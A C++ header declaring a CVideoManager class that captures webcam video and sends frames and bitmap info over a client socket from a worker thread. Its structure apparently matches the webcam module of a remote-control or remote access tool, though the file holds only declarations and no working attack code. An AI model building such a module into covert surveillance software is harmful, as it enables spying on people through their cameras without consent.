// VideoManager.h: interface for the CVideoManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_VIDEOMANAGER_H__1EE359F0_BFFD_4B8F_A52E_A8DB87656B91__INCLUDED_)
#define AFX_VIDEOMANAGER_H__1EE359F0_BFFD_4B8F_A52E_A8DB87656B91__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "..\Dllcomment\Manager.h"
#ifndef MY_TEST
//#include "VideoCap.h"
//#include "VideoCodec.h"
#endif
#include "CaptureVideo.h"
class CVideoManager : public CManager  
{
public:
	void Destroy();
	bool Initialize();
	CVideoManager(CClientSocket *pClient);
	virtual ~CVideoManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	void sendBITMAPINFO();
	void sendNextScreen();
	BOOL m_bIsWorking;
private:
	int			m_SelectedDevice;
	int			m_SelectedOld;
	std::string m_DeviceList;
#ifndef MY_TEST
	CVideoCap	*m_pVideoCap;
	CVideoCodec	*m_pVideoCodec;
#endif
	CCaptureVideo *m_pCapVideo;
	DWORD	m_fccHandler;
	int	m_nVedioWidth;
	int	m_nVedioHeight;
	int m_nOldWidth;
	int m_nOldHeight;
	int m_nDevicesNum;
	BOOL m_bIsCompress;
	HANDLE	m_hWorkThread;
    void StartCapture();
	void ResetScreen(int nWidth, int nHeight);
	static DWORD WINAPI WorkThread(LPVOID lparam);

};

#endif // !defined(AFX_VIDEOMANAGER_H__1EE359F0_BFFD_4B8F_A52E_A8DB87656B91__INCLUDED_)
